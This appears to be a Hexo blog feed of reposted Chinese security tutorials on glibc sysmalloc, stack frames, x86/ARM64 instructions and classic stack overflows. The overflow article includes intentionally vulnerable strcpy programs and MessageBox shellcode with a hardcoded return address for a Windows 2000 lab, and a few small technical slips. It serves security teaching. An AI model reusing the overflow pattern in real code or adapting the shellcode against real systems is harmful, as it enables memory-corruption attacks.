class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-keyword">static</span> void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;<br><br>    ...<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) av-&gt;system_mem &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (av-&gt;max_system_mem))<br>        av-&gt;max_system_mem = av-&gt;system_mem;<br>    check_malloc_state (av);<br><br>    p = av-&gt;top;<br>    size = chunksize(p);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE )) &#123;<br>        remainder_size = size - nb;<br>        remainder = chunk_at_offset(p, nb);<br>        av-&gt;top = remainder;<br>        set_head(p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>        set_head(remainder, remainder_size | PREV_INUSE);<br>        check_malloced_chunk (av, p, nb);<br>        <span class="hljs-keyword">return</span> chunk2mem(p);<br>    &#125;<br><br>    __set_errno(ENOMEM);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是获得前面所有代码更新后的top chunk，然后从该top chunk中分配用户需要的大小chunk并返回，如果失败则返回0。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单总结一下<code>sysmalloc</code>函数，这里不包含《malloc源码分析—2》中的代码，该代码用于初始化。首先进入<code>sysmalloc</code>函数就表示top chunk的空间不够了。<br>假设当前分配区不是主分配区，就通过<code>grow_heap</code>增加top chunk的空间，如果失败就通过<code>new_heap</code>重新分配一个heap，并将该分配区的top chunk指针指向新分配的heap的空闲内存。<br>如果当前分配区是主分配区，首先会通过<code>brk</code>在堆上分配内存以增加top chunk的空间，如果失败再通过<code>MMAP</code>分配。假设新分配内存的地址不连续，而分配区的连续标志位置位，就会继续分配内存以补偿。<br>最后，只要分配成功，就可以从被更新的top chunk分配所需的内存。</p><h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p><a href="https://introspelliam.github.io/">本文章装载于此</a></p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>源码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈溢出原理与实践</title>
    <link href="/2023/11/09/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
    <url>/2023/11/09/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/</url>
    
    <content type="html"><![CDATA[<p><b>声明：本章的所有实验都是在Windows 2000 Server上完成的。生成字符串并查找其偏移是在kali 2.0上，查找跳转函数的VA是在windows 10上用IDA。</b></p><h3 id="1-栈溢出原理"><a href="#1-栈溢出原理" class="headerlink" title="1. 栈溢出原理"></a>1. 栈溢出原理</h3><h4 id="1-1-修改邻接变量的原理"><a href="#1-1-修改邻接变量的原理" class="headerlink" title="1.1 修改邻接变量的原理"></a>1.1 修改邻接变量的原理</h4><p>用实例来反映原理</p><pre><code class="hljs">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define PASSWORD "1234567"int verify_password(char *password)&#123;    int authenticated;    char buffer[8];    authenticated = strcmp(password, PASSWORD);    strcpy(buffer, password);    return authenticated;&#125;void main()&#123;    int valid_flag = 0;    char password[1024];    while(1)    &#123;        printf("please input password:        ");        scanf("%s", password);        valid_flag = verify_password(password);        if (valid_flag)        &#123;            printf("incorrect password!\n\n");        &#125;        else        &#123;            printf("Congratulations! You have passed the verification!\n");            break;        &#125;    &#125;&#125;</code></pre><p>于是栈帧布局为：<br><img src="/images/2017-06-22/stack_layout.png" alt="栈帧布局"></p><p>因此，当你输入7位正确密码（”1234567”）或者输入8字节其他字符串（比原始字符串要大），都能通过验证。authenticated是int类型，在内存中是DWORD，占4个字节。所以当输入8位后，数组越界，buffer[8]、buffer[9]、buffer[10]、buffer[11]将写入相邻的变量authenticated中。</p><p><font color=#f00>win32系统中数据是由低位向高位存储一个4字节的双字（DWORD），但作为数值应用时，却是按照由高位字节向低位字节进行解释。</font></p><p>如果输入的是1234567，那么结果为：<br>34 33 32 31<br>00 37 36 35<br>一定要注意window字节顺序</p><h4 id="1-2-修改函数返回地址"><a href="#1-2-修改函数返回地址" class="headerlink" title="1.2 修改函数返回地址"></a>1.2 修改函数返回地址</h4><p>通过覆盖返回地址，我们可以跳转到我们想到达的位置</p><p><b>问题1：如何修改返回地址，并准确的判定返回地址所在位置？</b></p><p><font color=#0f0>在函数返回的”retn”指令执行时，栈顶元素恰好是这个返回地址。“retn”指令会把这个地址弹入EIP寄存器中，之后跳转到这个地址去执行。栈顶是OllyDbg右侧ESP标灰的那个</font></p><p>所以常见的解决办法是：<br>（1）输入一个较长的字符串，最好这个字符串有一定规律【这里可以使用&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit&#x2F;pattern_create.rb来创建一定长度的指令】，然后查看返回地址所指向的位置，看看是刚才所指定的字符串的哪个位置【这里可以使用&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit&#x2F;pattern_offset.rb 来查看字符串出现的地址】<br>（2）本机实验时，offset位置为16（此处的16指的是起始位置），因此如果想要对该程序的返回地址进行修改的话，就应该是<br>               <font color=#f00>‘a’*16+返回地址</font><font color=#0f0>（返回地址得逆序编写）</font></p><p><b>问题2：如何控制程序执行流程？</b></p><p>上面已经讲了如何修改返回地址，所以如果在进入某个子函数之后，有栈溢出，就可以修改相应的返回地址，让其能够跳转至想让其执行代码的位置，这样就能控制流程；</p><p>另外一种十分简单的办法就是直接修改PE文件，修改分支指令，这样也可以控制程序执行流程！</p><h3 id="2-代码植入"><a href="#2-代码植入" class="headerlink" title="2. 代码植入"></a>2. 代码植入</h3><h4 id="2-1-测试代码"><a href="#2-1-测试代码" class="headerlink" title="2.1 测试代码"></a>2.1 测试代码</h4><pre><code class="hljs">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;windows.h&gt;#define PASSWORD "1234567"int verify_password(char *password)&#123;    int authenticated;    char buffer[44];        //add local buff to be overflowed    authenticated = strcmp(password, PASSWORD);    strcpy(buffer, password);    //overflowed here!    return authenticated;&#125;void main()&#123;    int valid_flag = 0;    char password[1024];    FILE *fp;    LoadLibrary("user32.dll");    //prepare for messagebox    if (!(fp=fopen("password.txt","rw+")))    &#123;        exit(0);    &#125;    //MessageBoxA(0,"123","123",0);    fscanf(fp, "%s", password);    valid_flag = verify_password(password);    if(valid_flag)    &#123;        printf("incorrect password!\n\n");    &#125;    else    &#123;        printf("Congratulations! You have passed the verification!\n\n");    &#125;    fclose(fp);&#125;</code></pre><p><font color=#dd0>其中头文件windows.h，是方便程序能够顺利调用LoadLibrary函数去装载user32.dll<br>verify_password函数的局部变量buffer由8个字节增加到44字节，这样做是为了有足够的空间来“承载”我们植入的代码。<br>main函数中增加了LoadLibrary(“user32.dll”)用于初始化装载user32.dll，以便在植入代码中调用MessageBox。<br></font></p><p><b>需要完成的工作：</b></p><ol><li>分析并调试漏洞程序，获得淹没返回地址的偏移</li><li>获得buffer的起始地址，并将其写入password.txt的相应偏移，用来冲刷返回地址</li><li>向password.txt中写入可执行的机器代码，用来调用API弹出一个消息框。</li></ol><p><font color=#f00>通过调试可以获得buffer数组的起始地址0x0012FAF0，以及password.txt文件中第53~56个字符的ASCII码值将写入栈帧中的返回地址，成为函数返回后执行的指令地址</font></p><p>MSDN对该函数的解释如下：</p><pre><code class="hljs">int WINAPI MessageBox(  _In_opt_ HWND    hWnd,//handle to owner window  _In_opt_ LPCTSTR lpText,//text in message box  _In_opt_ LPCTSTR lpCaption,//messagebox title  _In_     UINT    uType//Messagebox style);</code></pre><ul><li>hWnd[in] 消息框所属窗口的句柄，如果为NULL，消息框则不属于任何窗口</li><li>IpText[in]  字符串指针，所指字符串会在消息框中显示</li><li>IpCaption[in]  字符串指针，所指字符串将成为消息框的标题</li><li>uType[in]  消息框的风格（单按钮、多按钮等），NULL代表默认风格</li></ul><p>熟悉MFC的程序员都知道，系统其实并不存在真正的MessageBox函数，对MessageBox这类API的调用最终都将由系统按照参数中字符串的类型选择“A”类函数（ASCII）或者“W”类型函数（UNICODE）调用。因此，本文中用的是MessageBoxA。</p><p><b>用汇编语言调用MessageBoxA需要三个步骤</b></p><ol><li>装载动态链接库user32.dll。MessageBoxA是动态链接库user32.dll的导出函数。虽然大多数有图形界面的程序都已经装载了该库，但是本实验的Console程序并没有默认加载。</li><li>在汇编语言中调用该函数需要获得这个函数的入口地址</li><li>在调用前需要向栈中从右向左的顺序压入MessageBoxA的4个参数</li></ol><p><font color=#f00>获取MessageBoxA的方式，我们在《查找动态链接库的API地址》那一篇博文中有讲，这里仅仅给出Windows 2000 Server的MessageBoxA地址为0x77E16544.</font></p><p>下面将让弹出的窗口显示标题和文本内容都为“failwest”，而压入的第一个和第四个参数都为NULL。</p><p><b><center>机器代码(具体操作可以参见《机器代码与汇编代码的转换》)</center></b></p><table><thead><tr><th>机器代码（十六进制）</th><th>汇编指令</th><th>注释</th></tr></thead><tbody><tr><td>33DB</td><td>XOR EBX, EBX</td><td></td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>6877657374</td><td>PUSH 74736577</td><td></td></tr><tr><td>6877657374</td><td>PUSH 74736577</td><td>压入NULL结尾的”failwest”字符串。之所以使用EBX清零后作为字符串的截断符，是为了避免”PUSH 0”中的NULL，否则植入的机器码会被strcpy函数截断</td></tr><tr><td>8BC4</td><td>MOV EAX, ESP</td><td>EAX里是字符串指针</td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>50</td><td>PUSH EAX</td><td></td></tr><tr><td>50</td><td>PUSH EAX</td><td></td></tr><tr><td>53</td><td>PUSH EBX</td><td>4个参数按照从右向左的顺序入栈，分别是(0,failwest,failwest,0)<br></td></tr><tr><td>消息框是默认风格，文本区和标题都是”failwest”</td><td></td><td></td></tr><tr><td>B84465E177</td><td>MOV EAX, 0x77E16544</td><td></td></tr><tr><td>FFD0</td><td>CALL EAX</td><td>调用函数MessageBoxA。这里的地址依据机器而定</td></tr></tbody></table><p>然后在这些代码与53—56处的buffer中0x0012FAF0(返回地址)，其余的字节用0x90(nop指令)填充。</p><p>shellcode[] &#x3D; “\x33\xdb\x53\x68\x77\x65\x73\x74\x68\x77\x65\x73\x74<br>\x8b\xc4\x53\x50\x50\x53\xb8\x44\x65\xe1\x77\xff\xd0\x90<br>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90<br>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf0\xfa\x12\x00”</p><p><img src="/images/2017-06-22/failwest_test.jpg" alt="测试结果"></p><h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p><a href="https://introspelliam.github.io/">本文章装载于此</a></p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈的介绍</title>
    <link href="/2023/11/09/%E6%A0%88%E7%9A%84%E4%BB%8B%E7%BB%8D/"/>
    <url>/2023/11/09/%E6%A0%88%E7%9A%84%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h3 id="1、内存的不同用途"><a href="#1、内存的不同用途" class="headerlink" title="1、内存的不同用途"></a>1、内存的不同用途</h3><p>进程使用的内存按照功能分为以下4个部分：<br>（1）代码区：这个区域存储着被装入执行的二进制机器代码，处理器会到这个区域取出指令并执行。<br>（2）数据区：用于存储全局变量<br>（3）堆区：进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。<br>（4）栈区：用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行。</p><p> 协作过程如图所示：<br><img src="/images/2017-06-22/stack_cooperate.png" alt="协作过程图"></p><p>内存中的栈区其实就是系统栈。系统栈由系统来维护。</p><h3 id="2、函数调用过程"><a href="#2、函数调用过程" class="headerlink" title="2、函数调用过程"></a>2、函数调用过程</h3><pre><code class="hljs">int func_B(int arg_B1, int arg_B2)&#123;     int var_B1, var_B2;     var_B1 = arg_B1 + arg_B2;     var_B2 = arg_B1 - arg_B2;     return var_B1 * var_B2;&#125;int func_A(int arg_A1, int arg_A2)&#123;     int var_A;     var_A = func_B(arg_A1, arg_A2) + arg_A1;     return var_A;&#125;int main(int argc, char **argv, char **envp)&#123;     int var_main;     var_main = func_A(4,3);     return var_main;&#125;</code></pre><p>同一文件的不同函数的代码在内存代码区中的分布可能是相邻也可能相距很远。代码的调用也如下图所示。<br><img src="/images/2017-06-22/code_addr.jpg" alt="代码指令所在位置和CPU在代码区中的取指轨迹"></p><p>代码区精确的跳转是在与系统栈巧妙地配合过程中完成的。当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，并把它压入栈中。这个栈帧中的内存空间被它所属的函数独占，正常情况下是不会和别的函数共享的。当函数返回时，系统栈会弹出该函数所对应的栈帧。<br><img src="/images/2017-06-22/stack_call.jpg" alt="系统栈在函数调用中的变化"></p><p>调用时的步骤：<br>（1）母函数调用子函数时，首先现在母函数所在栈帧里压入函数返回地址（一般为调用函数下面一条指令），然后为子函数创建新栈帧并压入系统栈（一般的步骤为push ebp[保存旧栈帧底部]  -&gt;  mov ebp, esp[将现在的栈顶换做栈帧底部]  -&gt; sub esp, xxx[抬高栈顶，为新栈帧开辟空间]）。<br>（2）子函数返回时，子函数的栈帧被弹出系统栈，母函数栈帧中的返回地址出现在栈顶，此时处理器按照这个返回地址重新跳到母函数代码区中执行。</p><h3 id="3、寄存器与函数栈帧"><a href="#3、寄存器与函数栈帧" class="headerlink" title="3、寄存器与函数栈帧"></a>3、寄存器与函数栈帧</h3><p>（1）ESP：栈指针寄存器（extended stack pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。<br>（2）EBP：基址指针寄存器（extended stack pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p><p>在函数栈帧中，一般包含以下几类重要信息：<br>（1）局部变量：为函数局部变量开辟的内存空间。<br>（2）堆栈状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本栈中被弹出后恢复出上一个栈帧。<br>（3）函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，以便在函数返回时能够恢复到函数被调用前的代码区中继续执行指令。</p><h3 id="4、函数调用约定与相关指令"><a href="#4、函数调用约定与相关指令" class="headerlink" title="4、函数调用约定与相关指令"></a>4、函数调用约定与相关指令</h3><p><b><center>几种调用方式的差异</center></b></p><table><thead><tr><th></th><th>C</th><th>SysCall</th><th>StdCall</th><th>BASIC</th><th>FORTRAN</th><th>PASCAL</th></tr></thead><tbody><tr><td>参数入栈顺序</td><td>右-&gt;左</td><td>右-&gt;左</td><td>右-&gt;左</td><td>左-&gt;右</td><td>左-&gt;右</td><td>左-&gt;右</td></tr><tr><td>恢复栈平衡操作的位置</td><td>母函数</td><td>子函数</td><td>子函数</td><td>子函数</td><td>子函数</td><td>子函数</td></tr></tbody></table><p><b><center>函数调用的约定</center></b></p><table><thead><tr><th>调用约定的声明</th><th>参数入栈顺序</th><th>恢复栈平衡的位置</th></tr></thead><tbody><tr><td>__cdecl</td><td>右-&gt;左</td><td>母函数</td></tr><tr><td>__fastcall</td><td>右-&gt;左</td><td>子函数</td></tr><tr><td>__stdcall</td><td>右-&gt;左</td><td>子函数</td></tr></tbody></table><p><font color=#f00>默认情况下，VC会使用__stdcall调用方式</font></p><p><font color=#f00>C++类成员函数都有一个this指针，在Windows平台中，这个指针一般是用ECX寄存器来传递的；但如果用GCC编译器编译，这个指针会作为最后一个参数压入栈中。</font></p><p><b>参数调用步骤</b>：</p><ol><li>参数入栈：由右向左压入参数</li><li>返回地址入栈：当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继续执行</li><li>代码区跳转：处理器从当前代码区跳转至被调用函数的入口处</li><li>栈帧调整：保存当前栈帧状态值，以备后面恢复栈帧时使用（EBP入栈）；将当前栈帧切换到新栈帧（EBP&lt;-ESP，更新栈帧底部）；给新栈帧分配空间（将ESP减去所需空间的大小，抬高栈顶）</li></ol><pre><code class="hljs">;调用前push 参数3;假设函数有3个参数，那么参数将由右向左依次入栈push 参数2push 参数1call 函数dizhi ;call指令将同时完成两项工作              ; a) 向栈中压入当前指令的下一条指令在内存中的位置，即保存返回地址              ; b) 跳转到所用函数的入口地址函数入口处push ebp;保存旧栈帧的底部mov ebp, esp;设置新栈帧的底部（栈帧切换）sub esp, xxx;设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间）</code></pre><p><img src="/images/2017-06-22/stack_info.png" alt="函数调用时系统栈中的变化情况"></p><p><b>函数返回时的步骤</b>：</p><ol><li>保存返回值（通常将函数的返回值保存到EAX中）</li><li>弹出当前栈帧，恢复上一个栈帧：在栈帧平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前栈帧的空间；将当前栈帧底部保存的前栈帧EBP值弹入EBP寄存器，恢复上一个栈帧；将函数返回地址弹给EIP寄存器</li><li>跳转：按照函数返回地址跳回母函数中继续执行</li></ol><pre><code class="hljs">add esp, xxx;降低栈顶，回收当前的栈帧pop ebp;将上一个栈帧底部恢复到ebpretn;这条指令有两个功能                ;a) 弹出当前栈顶元素，即弹出栈帧中的返回地址。                ;b) 让处理器跳转至弹出的返回地址，恢复调用前的代码区</code></pre><h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p><a href="https://introspelliam.github.io/">本文章装载于此</a></p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编中常见指令解释</title>
    <link href="/2023/11/09/%E6%B1%87%E7%BC%96%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4%E8%A7%A3%E9%87%8A/"/>
    <url>/2023/11/09/%E6%B1%87%E7%BC%96%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4%E8%A7%A3%E9%87%8A/</url>
    
    <content type="html"><![CDATA[<p><font color=#f00>这篇博文很有趣，竟然将hexo的content设置给冲垮了，感觉里面写了不可思议的东西，十分值得我去深挖！！！</font></p><br><h3 id="1-pop-和-push"><a href="#1-pop-和-push" class="headerlink" title="1. pop 和 push"></a>1. pop 和 push</h3><p>常见的汇编指令源码</p><table><thead><tr><th>pop机器码</th><th>含义</th><th>push机器码</th><th>含义</th></tr></thead><tbody><tr><td>5f</td><td>pop edi</td><td>57</td><td>push edi</td></tr><tr><td>5e</td><td>pop esi</td><td>56</td><td>push esi</td></tr><tr><td>5d</td><td>pop ebp</td><td>55</td><td>push ebp</td></tr><tr><td>5c</td><td>pop esp</td><td>54</td><td>push esp</td></tr><tr><td>5b</td><td>pop ebx</td><td>53</td><td>push ebx</td></tr><tr><td>5a</td><td>pop edx</td><td>52</td><td>push edx</td></tr><tr><td>59</td><td>pop ecx</td><td>51</td><td>push ecx</td></tr><tr><td>58</td><td>pop eax</td><td>50</td><td>push eax</td></tr></tbody></table><h3 id="2-call"><a href="#2-call" class="headerlink" title="2. call"></a>2. call</h3><pre><code class="hljs">call (short) eax1.将当前指令的下一条指令的地址压入栈中；2.JMP到EAX这个地址。</code></pre><pre><code class="hljs">call (long) eax1.将CS压入栈中；2.将当前指令的下一条指令的地址压入栈中；2.JMP到EAX这个地址。</code></pre><h3 id="3-retn-和-retf"><a href="#3-retn-和-retf" class="headerlink" title="3. retn 和 retf"></a>3. retn 和 retf</h3><pre><code class="hljs">retn1.将当前的ESP中指向的地址出栈；2.JMP到这个地址。</code></pre><pre><code class="hljs">retn k1.将当前的ESP中指向的地址出栈；2.JMP到这个地址；3.弹出栈顶的k个字节的数据</code></pre><pre><code class="hljs">retf1.将当前的ESP中指向的地址出栈给EIP；2.将当前的ESP中指向的地址出栈给CS；2.JMP到这个地址。</code></pre><h3 id="4-jmp"><a href="#4-jmp" class="headerlink" title="4. jmp"></a>4. jmp</h3><pre><code class="hljs"><font color=#f00>jmp短跳</font>\xeb\xf6: jmp short $-8（其中$指代当前EIP）在Asm2MachineCode(x86)中如果要尝试jmp short $-8，是不可能实现的，但是我们可以：1. ImageBase（hex）设置为0012ff60 <font color=#f00>(此处为当前的EIP地址)</font>2. jmp short 0012FF58  </code></pre><pre><code class="hljs"><font color=#f00>jmp长跳</font>\xE9\x2B\xFF\xFF\xFF\xFF: jmp 0x0012FF30在Asm2MachineCode(x86)中如果要尝试jmp short $-8，是不可能实现的，但是我们可以：1. ImageBase（hex）设置为0012ff58 <font color=#f00>(此处为当前的EIP地址)</font>2. jmp 0012FE88</code></pre><h3 id="5-cmp"><a href="#5-cmp" class="headerlink" title="5. cmp"></a>5. cmp</h3><p>cmp op1, op2</p><p>ZF&#x3D;1 这个简单，则说明两个数相等</p><p>当无符号时：<br>CF&#x3D;1 则说明了有进位或借位，cmp是进行的减操作，故可以看出为借位，所以，此时oprd1&lt;oprd2<br>CF&#x3D;0 则说明了无借位，但此时要注意ZF是否为0，若为0，则说明结果不为0，故此时oprd1&gt;oprd2</p><p>当有符号时：<br>若SF&#x3D;0，OF&#x3D;0 则说明了此时的值为正数，没有溢出，可以直观的看出，oprd1&gt;oprd2<br>若SF&#x3D;1，OF&#x3D;0 则说明了此时的值为负数，没有溢出，则为oprd1&lt;oprd2<br>若SF&#x3D;0，OF&#x3D;1 则说明了此时的值为正数，有溢出，可以看出oprd1&lt;oprd2<br>若SF&#x3D;1，OF&#x3D;1则说明了此时的值为负数，有溢出，可以看出oprd1&gt;oprd2</p><p>最后两个可以作出这种判断的原因是，溢出的本质问题：<br>两数同为正，相加，值为负，则说明溢出<br>两数同为负，相加，值为正，则说明溢出<br>故有，正正得负则溢出，负负得正则溢出</p><h3 id="6-leave"><a href="#6-leave" class="headerlink" title="6. leave"></a>6. leave</h3><p>其作用是删除函数的栈帧</p><p>leave在32位汇编下相当于</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">esp</span>,<span class="hljs-built_in">ebp</span>                                            <br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebp</span><br></code></pre></td></tr></table></figure><h3 id="7-les"><a href="#7-les" class="headerlink" title="7. les"></a>7. les</h3><p>LES( load ES)指令的功能是：把内存中指定位置的双字操作数的低位字装入指令中指定的寄存器、高位字装入ES寄存器。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">LES DSET，<span class="hljs-attribute">SRC</span><br>LES REG，MEM<br>DEST为<span class="hljs-built_in">destination</span>(目的地址)，<span class="hljs-attribute">SRC</span>为<span class="hljs-built_in">source</span>(源地址)；<br>REG为<span class="hljs-built_in">register</span>(CPU寄存器)，MEM为<span class="hljs-built_in">memory</span>(内存地址)。<br></code></pre></td></tr></table></figure><p>DEST&#x3D;WORD PTR[SRC]</p><p>ES&#x3D;WORD PTR[SRC+2]</p><p>DEST赋值为SRC处双字的低位；</p><p>ES赋值为SRC处双字的高位；</p><h3 id="8-比较"><a href="#8-比较" class="headerlink" title="8. 比较"></a>8. 比较</h3><p>A（above）大于、B（below）小于、E（equal）等于，用于比较无符号数</p><p>G（great）大于、L（less than）小于、E（equal）等于，用于比较带符号数</p><p>其实这些地方也是漏洞点，有时候比较没有对是否有符号进行确定，所以可能会出问题。</p><h3 id="9-lods-stos"><a href="#9-lods-stos" class="headerlink" title="9. lods&#x2F;stos"></a>9. lods&#x2F;stos</h3><p>lodsb指令，将esi指向的地址处的数据取出来赋给AL寄存器, esi&#x3D;esi+1；</p><p>lodsw指令则取得是一个字。</p><p>lodsd指令，取得是双字节，即mov eax，[esi]，esi&#x3D;esi+4；</p><p>stosb指令，将AL寄存器的值取出来赋给edi所指向的地址处。mov [edi]，AL；edi&#x3D;edi+1；</p><p>stosw指令去的是一个字。</p><p>stosd指令，取得是双字节，mov [edi]，eax；edi&#x3D;edi+4；</p><h1 id="数学指令"><a href="#数学指令" class="headerlink" title="数学指令"></a>数学指令</h1><p>add src, dest<br>将 src 添加到 dest 。</p><p>sub src, dest<br>从 dest 中减去 src 。</p><p>imul src, dest<br>将 dest 乘以 src 。</p><p>idiv divisorDivide rdx:rax<br>将 rdx:rax 除以 divisor 。将商存储在 rax 中，并将余数存储在 rdx 中。</p><p>shr reg<br>shl reg<br>将 reg 向左或向右移动 cl 中的值（ rcx 的低 8 位）。</p><p>ror src, dest<br>将 dest 向左或向右循环 src 位。</p><p>cmp src, dest<br>设置与 dest 是否小于、等于或大于 src 相对应的标志</p><h1 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h1><h2 id="endbr64"><a href="#endbr64" class="headerlink" title="endbr64"></a>endbr64</h2><p>如果我们使用gdb查看程序的汇编代码，我们会发现第一句往往是<code>endbr64</code>。这个语句实际上是一个安全语句。为了对付ROP、JOP、COP攻击技术。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/htJ73BQK5zRTReHRaAqwxg">https://mp.weixin.qq.com/s/htJ73BQK5zRTReHRaAqwxg</a></p><h1 id="0x1-ARM64"><a href="#0x1-ARM64" class="headerlink" title="0x1. ARM64"></a>0x1. ARM64</h1><h2 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h2><p>传送指令：将立即数传送到寄存器&#x2F;内存单元，或互传内存单元和寄存器两者中的数据。</p><p>例如：mov x0, #0x1 &#x2F; mov $0x1, %rdi 将立即数0x1移动到寄存器x0&#x2F;rdi中</p><h2 id="mvn"><a href="#mvn" class="headerlink" title="mvn"></a>mvn</h2><p>该指令与mov唯一不同的是：需要对操作数进行按位取反。</p><h2 id="str"><a href="#str" class="headerlink" title="str"></a>str</h2><p>store register. 将寄存器中的数据存到内存单元中。</p><p>例如：str x0, [sp, #0x28] 将寄存器x0中的数据存到地址sp+0x28处</p><h2 id="stp"><a href="#stp" class="headerlink" title="stp"></a>stp</h2><p>store pair of registers.</p><p>例如：stp x29, x30, [sp, #0x70] 先将x29存到地址sp+0x70处，再将x30存到sp+0x78处 (Tip1)。</p><p>{ %note info % }<br>Tip1: 64位下，寄存器大小为8bytes<br>{ %endnote% }</p><h2 id="ldr"><a href="#ldr" class="headerlink" title="ldr"></a>ldr</h2><p>load register. 从内存中读取数据，存到寄存器中。</p><p>例如：ldr x1, [sp, #0x30] 将内存地址sp+0x30处的数据加载到x1中。</p><h2 id="ldp"><a href="#ldp" class="headerlink" title="ldp"></a>ldp</h2><p>load pair of registers.</p><p>例如：ldp x29, x30, [sp, #0x70] 将内存地址sp+0x70处的数据加载到x29中，再将sp+0x78(Tip1)处的数据加载到x30中。</p><h2 id="b"><a href="#b" class="headerlink" title="b"></a>b</h2><p>branch. 无条件跳转。</p><p>例如：b 0x1b6b79cf8 跳转到0x1b6b79cf8处继续执行。</p><h2 id="bl"><a href="#bl" class="headerlink" title="bl"></a>bl</h2><p>branch with link. 将下一条指令地址copy到lr中，然后跳转。由于保存了下一条指令地址(相对于pc)，所以可实现子程序的返回，而b只能单纯的实现跳转，不能实现子程序返回。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">   0x102b7d8a4 &lt;+160&gt;: bl   0x102bda450 ; symbol stub for: objc_msgSend<br>-&gt; 0x102b7d8a8 &lt;+164&gt;: adrp x0, 107<br></code></pre></td></tr></table></figure><p>当程序执行完bl指令时，lr中的内容应该是是bl下一条指令的地址，即0x102b7d8a8。通过控制台查看lr中的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">fp = 0x000000016d2853c0<br>lr = 0x0000000102b7d8a8  `-[AppDelegate application:didFinishLaunchingWithOptions:] + 164 at AppDelegate.m:41:5<br>sp = 0x000000016d285350<br></code></pre></td></tr></table></figure><h2 id="cbz"><a href="#cbz" class="headerlink" title="cbz"></a>cbz</h2><p>compare and branch on zero. 比较操作数是否为0，若为0则跳转。</p><p>例如：cbz w24, 0x1b6b798f4 若w24 (x24寄存器低32位) 中的数据为0，则跳转到0x1b6b798f4处执行 (Note1)。</p><p>Note1: 跳转地址需要在cbz&#x2F;cbnz指令之后的4~130字节内。</p><h2 